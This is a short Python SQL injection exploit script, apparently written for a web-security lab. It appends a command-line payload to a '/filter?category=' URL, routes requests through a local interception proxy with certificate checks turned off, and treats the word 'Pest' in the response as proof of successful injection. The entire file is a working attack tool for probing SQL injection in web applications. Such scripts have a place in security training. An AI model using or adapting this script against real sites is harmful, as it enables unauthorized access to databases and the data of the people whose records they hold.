import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_exploit(url, payload):

    uri = '/filter?category='

    r = requests.get(url + uri + payload,verify=False,proxies=proxies)
    if 'Pest' in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage %s <url> <payload> ' % sys.argv[0].strip())
        print('[-] Example %s example.com/product/ "1=1" ' % sys.argv[0].strip())
        sys.exit(-1)

if sqli_exploit(url, payload):
    print("[+] SQL Injection success")
else:
    print("[-] SQL Injection failed ")
